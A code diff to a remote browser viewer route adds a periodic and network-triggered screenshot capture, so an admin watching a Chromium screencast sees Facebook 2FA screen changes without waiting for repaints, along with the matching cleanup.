@@ -234,6 +234,25 @@ export default async function viewerRoutes(app) {
     };
     page.on('framenavigated', navHandler);
 
+    // Chromium's CDP screencast only emits a frame when the compositor
+    // actually REPAINTS. Facebook's 2FA screens often swap via React
+    // without touching the compositor (same background, overlay-level
+    // DOM changes), so the admin would stare at the stale login form
+    // for 60-120s even though the new screen is already there.
+    //
+    // Heartbeat: force a capture every 2s regardless of repaints. Users
+    // see any DOM-level change (modal, redirect, QR code) within 2s,
+    // not when Chrome decides a repaint is worth sending.
+    const heartbeatTimer = setInterval(() => {
+      if (socket.readyState === socket.OPEN) captureAndSend();
+    }, 2000);
+
+    // Also force a capture whenever the page's network becomes active —
+    // XHR responses frequently carry the "login step N" update even
+    // when the compositor stays still.
+    const networkHandler = () => captureAndSend();
+    page.on('response', networkHandler);
+
     // --- inbound: input events ---
     onMessage = async (raw) => {
       let msg;
@@ -307,8 +326,10 @@ export default async function viewerRoutes(app) {
     // --- cleanup ---
     const cleanup = async () => {
       clearInterval(statsTimer);
+      clearInterval(heartbeatTimer);
       clearTimeout(navDebounce);
       page.off('framenavigated', navHandler);
+      page.off('response', networkHandler);
       try { cdp.off('Page.screencastFrame', onFrame); } catch { /* ignore */ }
       try {
         await cdp.send('Page.stopScreencast');
